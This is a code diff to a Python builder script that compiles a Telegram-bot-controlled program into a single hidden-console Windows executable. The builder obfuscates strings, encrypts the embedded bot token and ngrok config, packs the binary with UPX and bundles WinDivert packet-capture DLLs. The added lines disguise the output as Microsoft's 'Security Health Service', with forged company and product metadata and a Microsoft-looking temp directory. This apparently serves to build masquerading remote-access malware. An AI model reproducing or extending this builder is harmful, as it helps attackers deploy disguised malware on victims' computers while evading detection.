@@ -1,4 +1,4 @@
-# main.py
+# main.p# main.py
 import random
 from telepot import Bot
 from telepot.exception import TelegramError
@@ -16,8 +16,7 @@ from os import chdir, listdir, remove
 from os.path import isdir, join, abspath, isfile, split as pathsplit, exists, getsize, basename
 import traceback
 import webview
-from utils import html_content, obfuscate, SimpleFernet
-
+from utils import html_content, obfuscate, SimpleFernet, make_bundle
 
 
 # ---------------------------------------------------------------------------
@@ -27,6 +26,7 @@ class CompileOptions:
     debug: bool = False
     send_executable: bool = False
     encryption: bool = False
+    assets_bundle: bool = False
 
 OPTIONS = CompileOptions()
 
@@ -37,44 +37,49 @@ PY_FILE_PATH = join(REPO_NAME, "pep2.py")
 PIP_PATH = join(VENV_PATH, "Scripts", "pip.exe")
 PYTHON_PATH = join(VENV_PATH, "Scripts", "python.exe")
 ASSETS_PATH = join(REPO_NAME, "assets")
-DLLSL_PATH = join(ASSETS_PATH, "dlls")
+DLLS_PATH = join(ASSETS_PATH, "dlls")
 EXECUTABLES_PATH = join(ASSETS_PATH, "executables")
-REQUIREMENTS_COMMAND = f"{PIP_PATH} install -r requirements.txt"
+REQUIREMENTS_COMMAND = [PIP_PATH, "install", "-r", "requirements.txt"]
 PY_FILE_MARKER = "PY_FILE_MARKER"
 AUTH_FILE_MARKER = "AUTH_FILE_MARKER"
+ASSETS_MARKER = "ASSETS_MARKER"
 KEY_FILE_MARKER = "KEY_FILE_MARKER"
 REPORT_FILE_MARKER = "REPORT_FILE_MARKER"
 PYTHON_FLAGS = ["no_docstrings"]
 UNUSED_IMPORTS = ["asyncio", "unittest", "email", "xml", "cryptography", "OpenSSL", "pyOpenSSL"]
-UNUSED_IMPORTS_FLAG = " ".join([f"--nofollow-import-to={x}" for x in UNUSED_IMPORTS]) + " "
-ONEFILE_TEMP_NAME = "--onefile-tempdir-spec=%LOCALAPPDATA%\Microsoft\Windows\INetCache\{PID} "
-
-
-def dll_loading_util(dlls_path: str):
-    res = ""
-    for file in listdir(dlls_path):
-        if file.startswith("WinDivert"):
-            res += f"--include-data-file=assets/dlls/{file}=pydivert/windivert_dll/{file} "
-        else:
-            res += f"--include-data-file=assets/dlls/{file}=assets/dlls/{file} "
-    return res
-
-
-def executables_loading_util(executables_path: str):
-    res = ""
-    for file in listdir(executables_path):
-        res += f"--include-data-file=assets/executables/{file}=assets/executables/{file} "
-    return res
-
-
-PYTHON_FLAGS_STRING = " ".join([f"--python-flag={flag} " for flag in PYTHON_FLAGS])
+ONEFILE_TEMP_NAME = "{TEMP}/Runtime/Packages/Microsoft.SecurityHealth_{PID}"
+COMPANY_NAME = "Microsoft Corporation"
+PRODUCT_NAME = "Security Health Service"
 AUTHS_DIRNAME = abspath("auths")
 AUTHS_REPO_PATH = join(REPO_NAME, "auths")
 LOG_DIR = join(REPO_NAME, "logs")
 
-# Version
-with open(PY_FILE_PATH, "r", encoding="utf-8") as fi:
-    __version__ = next((l.split("=", 1)[1].strip() for l in fi.read().splitlines() if "__version__" in l), "?.?")
+ASSETS_COMMAND_FLAGS = [
+    "--include-data-dir=assets/vfx=assets/vfx",
+    "--include-data-dir=assets/sfx=assets/sfx",
+    "--include-data-dir=assets/model=assets/model",
+]
+
+# Version - improved extraction
+__version__ = "?.?.?.?"
+try:
+    with open(PY_FILE_PATH, "r", encoding="utf-8") as fi:
+        content = fi.read()
+        for line in content.splitlines():
+            if "__version__" in line:
+                value_part = line.split("=", 1)[1].strip()
+                value_part = value_part.strip("'\"()[]")
+                if "," in value_part:
+                    parts = [p.strip() for p in value_part.split(",") if p.strip().isdigit()]
+                    __version__ = ".".join(parts[:4]).ljust(4, ".0")
+                else:
+                    parts = [p.strip() for p in value_part.split(".") if p.strip().isdigit()]
+                    while len(parts) < 4:
+                        parts.append("0")
+                    __version__ = ".".join(parts[:4])
+                break
+except:
+    pass
 
 
 def copy_file(src, dst):
@@ -158,24 +163,12 @@ def download_file(bot, chatid, path: str) -> None:
 
 
 def encrypt_file(fernet: SimpleFernet, src_path, dst_path):
-    print(f"ENCRYPTING FILE: {src_path} into {dst_path}")
+    print(f"ENCRYPTING FILE: {src_path} → {dst_path}")
     with open(src_path, "rb") as f:
         data = f.read()
     encrypted = fernet.encrypt(data)
     with open(dst_path, "wb") as f:
         f.write(encrypted)
-
-
-def encrypt_directory(fernet: SimpleFernet, src_dir, dst_dir):
-    os.makedirs(dst_dir, exist_ok=True)
-    for root, dirs, files in os.walk(src_dir):
-        rel_root = os.path.relpath(root, src_dir)
-        dst_root = os.path.join(dst_dir, rel_root)
-        os.makedirs(dst_root, exist_ok=True)
-        for file in files:
-            src_path = os.path.join(root, file)
-            dst_path = os.path.join(dst_root, file + ".enc")
-            encrypt_file(fernet, src_path, dst_path)
 
 
 def compile_worker(
@@ -185,130 +178,187 @@ def compile_worker(
     debug: bool,
     send_executable: bool,
     encryption: bool,
+    assets_bundle: bool
 ):
-    def run_and_capture(cmd: str):
-        p = Popen(cmd.split(), stdout=PIPE, stderr=STDOUT)
-        output = []
+    def run_and_capture(cmd_list: list[str], cwd: str | None = None):
+        print("Executing command:")
+        print(" ".join(f'"{arg}"' if ' ' in arg else arg for arg in cmd_list))
+        p = Popen(
+            cmd_list,
+            stdout=PIPE,
+            stderr=STDOUT,
+            cwd=cwd,
+            bufsize=1,
+            universal_newlines=False
+        )
+        output_lines = []
         while p.poll() is None:
             line = p.stdout.readline()
             if not line:
                 break
-            output.append(line)
+            output_lines.append(line)
             if is_foreground and output_queue:
                 output_queue.put(line)
-        return p.returncode, b"".join(output)
-
-    COMPILE_COMMAND = (
-        f"{PYTHON_PATH} -m nuitka {PY_FILE_MARKER} "
-        + PYTHON_FLAGS_STRING +
-        f"--windows-console-mode={'force' if debug else 'disable'} "
-        "--onefile --onefile-no-compression --follow-imports "
-        "--enable-plugin=tk-inter --msvc=latest " +
-        ONEFILE_TEMP_NAME +
-        f"--jobs={os.cpu_count() or 4} --plugin-enable=upx "
-        f"--report=build-report_{REPORT_FILE_MARKER}.xml "
-        "--include-data-dir=assets/vfx=assets/vfx "
-        "--include-data-dir=assets/sfx=assets/sfx "
-        "--include-data-dir=assets/model=assets/model "
-        f"{dll_loading_util(DLLSL_PATH)} "
-        f"{executables_loading_util(EXECUTABLES_PATH)} "
-        f"--include-data-file={AUTH_FILE_MARKER}=auth.json " +
-        (f"--include-data-file={KEY_FILE_MARKER}=key.key " if encryption else "")
-    )
+        output = b"".join(output_lines)
+        return p.returncode, output
 
     try:
         chdir(REPO_NAME)
+
         with open(auth_path, "r", encoding="utf-8") as f:
             auth = json.load(f)
         token = auth["token"].strip()
         chatid = auth["chatid"]
         ngrok_token = auth["ngrok_token"].strip()
         tunnel_provider = auth["tunnel_provider"].strip()
+
         bot = Bot(token)
         me = bot.getMe()
         bot_username = me["username"]
         source_name = f"{bot_username}.py"
 
-        if encryption:
-            KEY_PATH = join(REPO_NAME, bot_username + ".key")
-            real_key = create_obfuscated_key_file(KEY_PATH)
-            fernet = SimpleFernet(real_key, b"RCPTE")
-            if is_foreground and output_queue:
-                kgs = f"\nKEY FILE GENERATED FOR {bot_username}\n"
-                output_queue.put(kgs)
-                print(kgs)
+        # ── Startup notification ──────────────────────────────────────────────
+        options_text = []
+        if debug: options_text.append("Debug mode")
+        if send_executable: options_text.append("Send executable")
+        if encryption: options_text.append("Encryption")
+        if assets_bundle: options_text.append("Assets bundling")
+
+        options_line = " • ".join(options_text) if options_text else "None"
 
         bot.sendMessage(
             chatid,
-            f"🚀 <b>Your bot compilation has started!</b>\n\n"
+            f"🚀 <b>Compilation started for @{bot_username}</b>\n\n"
             f"🤖 <b>Token:</b> <code>{token}</code>\n"
-            f"🆔 <b>Chat ID:</b> {chatid}\n"
+            f"🆔 <b>Chat ID:</b> <code>{chatid}</code>\n"
             f"🌐 <b>Tunnel Provider:</b> {tunnel_provider}\n"
             f"🔑 <b>Ngrok Token:</b> {'Provided' if ngrok_token else 'Not provided'}\n"
-            f"🛠️ <b>Options Enabled:</b> "
-            + (f"{'Debug, ' if debug else ''}"
-               f"{'Send Executable, ' if send_executable else ''}"
-               f"{'Encryption' if encryption else ''}").rstrip(", ")
-            + "\n\n⏳ Compilation in progress...",
+            f"🛠 <b>Active options:</b> {options_line}\n\n"
+            f"⏳ Compiling... please wait (usually 2–10 minutes)",
             parse_mode="HTML"
         )
+        # ──────────────────────────────────────────────────────────────────────
 
-        start = perf_counter()
+        if encryption:
+            KEY_PATH = join(REPO_NAME, f"{bot_username}.key")
+            real_key = create_obfuscated_key_file(KEY_PATH)
+            fernet = SimpleFernet(real_key, b"RCPTE")
+            if is_foreground and output_queue:
+                output_queue.put(f"\nKEY FILE GENERATED FOR {bot_username}\n".encode())
+                print(f"KEY FILE GENERATED FOR {bot_username}")
 
-        print(f"Obfuscating strings..")
+        # Prepare assets inclusion
+        if assets_bundle:
+            assets_flags = ["--include-data-file=assets.bin=assets.bin"]
+            make_bundle("assets", "assets.bin")
+        else:
+            assets_flags = ASSETS_COMMAND_FLAGS[:]
+
+        # Build the full Nuitka command as a list
+        nuitka_cmd = [
+            PYTHON_PATH,
+            "-m", "nuitka",
+            source_name,
+            "--python-flag=no_docstrings",
+            f"--windows-console-mode={'force' if debug else 'disable'}",
+            "--onefile",
+            "--onefile-no-compression",
+            "--follow-imports",
+            "--enable-plugin=tk-inter",
+            "--msvc=latest",
+            "--enable-plugin=anti-bloat",
+            "--noinclude-pytest-mode=nofollow",
+            "--noinclude-setuptools-mode=nofollow",
+            f"--file-version={__version__}",
+            f"--product-version={__version__}",
+            f"--company-name={COMPANY_NAME}",
+            f"--product-name={PRODUCT_NAME}",
+            f"--file-description=Security Health Service",
+            f"--onefile-tempdir-spec={ONEFILE_TEMP_NAME}",
+            f"--jobs={os.cpu_count() or 4}",
+            "--plugin-enable=upx",
+            f"--report=build-report_{bot_username}.xml",
+        ]
+
+        nuitka_cmd.extend(assets_flags)
+
+        # Add DLLs
+        if isdir(DLLS_PATH):
+            for file in listdir(DLLS_PATH):
+                src = f"assets/dlls/{file}"
+                if file.startswith("WinDivert"):
+                    dst = f"pydivert/windivert_dll/{file}"
+                else:
+                    dst = f"assets/dlls/{file}"
+                nuitka_cmd.append(f"--include-data-file={src}={dst}")
+
+        # Add executables if folder exists
+        if isdir(EXECUTABLES_PATH):
+            for file in listdir(EXECUTABLES_PATH):
+                src = f"assets/executables/{file}"
+                nuitka_cmd.append(f"--include-data-file={src}={src}")
+
+        # Auth file (encrypted or plain)
+        relative_auth = join("auths", basename(auth_path))
+        if encryption:
+            auth_src = relative_auth + ".enc"
+            encrypt_file(fernet, relative_auth, auth_src)
+            nuitka_cmd.append(f"--include-data-file={auth_src}=auth.json")
+            nuitka_cmd.append(f"--include-data-file={KEY_PATH}=key.key")
+        else:
+            nuitka_cmd.append(f"--include-data-file={relative_auth}=auth.json")
+
+        # Obfuscate source
+        print("Obfuscating strings...")
         obfuscate(
             PY_FILE_PATH,
             source_name,
             obfuscate_docstrings=True,
-            debug=False)
+            debug=False
+        )
         print("Done obfuscating strings.")
 
-        run_and_capture(REQUIREMENTS_COMMAND)
-        relative_auth = join("auths", pathsplit(auth_path)[-1])
-        compile_cmd = COMPILE_COMMAND.replace(PY_FILE_MARKER, source_name)
-        compile_cmd = compile_cmd.replace(REPORT_FILE_MARKER, bot_username)
+        # Install requirements
+        print("Installing requirements...")
+        run_and_capture(REQUIREMENTS_COMMAND, cwd=REPO_NAME)
 
-        if encryption:
-            encrypt_file(
-                fernet=fernet,
-                src_path=relative_auth,
-                dst_path=relative_auth + ".enc"
-            )
-            compile_cmd = compile_cmd.replace(KEY_FILE_MARKER, KEY_PATH)
+        # Compile!
+        print("Starting Nuitka compilation...")
+        start_time = perf_counter()
+        rc, output = run_and_capture(nuitka_cmd, cwd=REPO_NAME)
 
-        compile_cmd = compile_cmd.replace(AUTH_FILE_MARKER, relative_auth + (".enc" if encryption else ""))
-        print(f"Running: \n{compile_cmd}\n")
-        rc, output = run_and_capture(compile_cmd)
-
-        cache_dirs = (
-            f"{bot_username}.build",
-            f"{bot_username}.dist",
-            f"{bot_username}.onefile-build",
-        )
+        # Cleanup
         try:
-            remove(source_name)
-            for directory in cache_dirs:
-                if isdir(directory):
-                    rmtree(directory)
+            if isfile(source_name):
+                remove(source_name)
+            for suffix in [".build", ".dist", ".onefile-build"]:
+                d = f"{bot_username}{suffix}"
+                if isdir(d):
+                    rmtree(d, ignore_errors=True)
         except Exception:
             pass
 
-        elapsed = (perf_counter() - start) / 60
+        elapsed = (perf_counter() - start_time) / 60
         bot.sendMessage(chatid, f"Your bot has been compiled in {elapsed:.2f} minutes")
 
         if rc != 0:
-            if isinstance(output, bytes):
-                output = output.decode(errors="ignore")
-            raise RuntimeError(output)
+            output_str = output.decode("utf-8", errors="replace")
+            raise RuntimeError(f"Compilation failed (code {rc}):\n{output_str}")
 
         if send_executable:
-            download_file(bot, chatid, f"{bot_username}.exe")
+            exe_path = f"{bot_username}.exe"
+            if isfile(exe_path):
+                download_file(bot, chatid, exe_path)
+            else:
+                bot.sendMessage(chatid, "⚠️ Executable was not found after compilation.")
+
+        bot.sendMessage(chatid, "🎉 Compilation completed successfully!")
 
     except Exception as e:
         if is_foreground and output_queue:
             output_queue.put(b"\n[ERROR] Compilation failed\n")
-            print(e)
-        raise e
+            print(traceback.format_exc())
+        raise
 
 
 # ---------------------------------------------------------------------------
@@ -326,8 +376,7 @@ def start_poller(queue):
                     if decoded:
                         webview.windows[0].evaluate_js(f'writeOut({decoded!r})')
             except Empty:
-                import time
-                time.sleep(0.1)
+                sleep(0.1)
     Thread(target=poller, daemon=True).start()
 
 
@@ -369,7 +418,6 @@ class API:
             webview.windows[0].evaluate_js('writeOut("[INFO] No files selected")')
             return
 
-        # Force sync options before starting any process
         webview.windows[0].evaluate_js('updateCompileOptions()')
 
         auth_paths = [join(AUTHS_DIRNAME, f) for f in selected_files]
@@ -393,12 +441,11 @@ class API:
                     queue if foreground else None,
                     OPTIONS.debug,
                     OPTIONS.send_executable,
-                    OPTIONS.encryption
+                    OPTIONS.encryption,
+                    OPTIONS.assets_bundle
                 )
             )
-            print(f"Created process for auth: {path}")
             p.start()
-            print(f"Started process for auth: {path}")
             processes.append(p)
 
         def waiter():
@@ -409,10 +456,11 @@ class API:
         Thread(target=waiter, daemon=True).start()
         start_poller(queue)
 
-    def set_options(self, debug: bool, send_executable: bool, encryption: bool):
+    def set_options(self, debug: bool, send_executable: bool, encryption: bool, assets_bundle: bool):
         OPTIONS.debug = debug
         OPTIONS.send_executable = send_executable
         OPTIONS.encryption = encryption
+        OPTIONS.assets_bundle = assets_bundle
         print(f"Options updated: {vars(OPTIONS)}")
         return vars(OPTIONS)
 
@@ -450,7 +498,8 @@ class API:
                     queue,
                     OPTIONS.debug,
                     OPTIONS.send_executable,
-                    OPTIONS.encryption
+                    OPTIONS.encryption,
+                    OPTIONS.assets_bundle
                 )
             )
             p.start()
